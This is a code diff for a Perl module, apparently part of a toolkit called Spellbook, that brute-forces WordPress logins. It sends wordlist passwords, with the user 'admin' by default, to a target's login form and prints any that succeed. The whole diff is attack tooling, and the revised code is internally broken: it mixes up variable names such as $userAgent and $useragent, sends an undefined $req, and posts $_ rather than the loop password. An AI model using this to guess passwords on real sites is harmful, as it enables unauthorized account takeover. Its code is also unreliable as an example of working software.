@@ -4,38 +4,51 @@ package Spellbook::Bruteforce::Wordpress {
     use LWP::UserAgent;
     use HTTP::Request::Common;
 
-    # THIS IS A DRAFT MODULE
+    our $VERSION = '0.0.1';
 
     sub new {
         my ($self, $parameters) = @_;
-        my ($help, $target, $username);
+        my ($help, $target, $username, $wordlist);
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
-            "h|help"       => \$help,
-            "t|target=s"   => \$target,
-            "u|usarname=s" => \$username,
+            'h|help'       => \$help,
+            't|target=s'   => \$target,
+            'u|username=s' => \$username,
+            "w|wordlist=s" => \$wordlist
         );
 
         if ($target) {
-            open(my $wordlist, "<", "./files/rockyou.txt");
+            if ($target !~ /^http(s)?:\/\//){
+                $target = 'https://' . $target;
+            }
 
-            while (<$wordlist>) {
-                chomp ($_);
+            if (!$username) {
+                $username = 'admin';
+            }
 
-                my $useragent = LWP::UserAgent->new;
+            if (!$wordlist) {
+                $wordlist = 'wordlists/passwords.txt';
+            }
 
-                my $response = $useragent -> request(POST $target, [
+            my $wordlist_content = Spellbook::Helper::Read_File -> new(['--file' => $wordlist]);
+            my $userAgent = Spellbook::Core::UserAgent -> new();
+
+            foreach my $password (@$wordlist_content) {
+                chomp($password);
+
+                my $request = $useragent -> request(POST $target, [
                     log => $username,
                     pwd => $_,
                 ]);
+                
+                my $response = $useragent -> request($req);
 
                 if ($response -> is_success) {
                     print "Successfully logged in with password: $_ \n";
                 }
             }
-
-            close($wordlist);
+            
         }
 
         if ($help) {
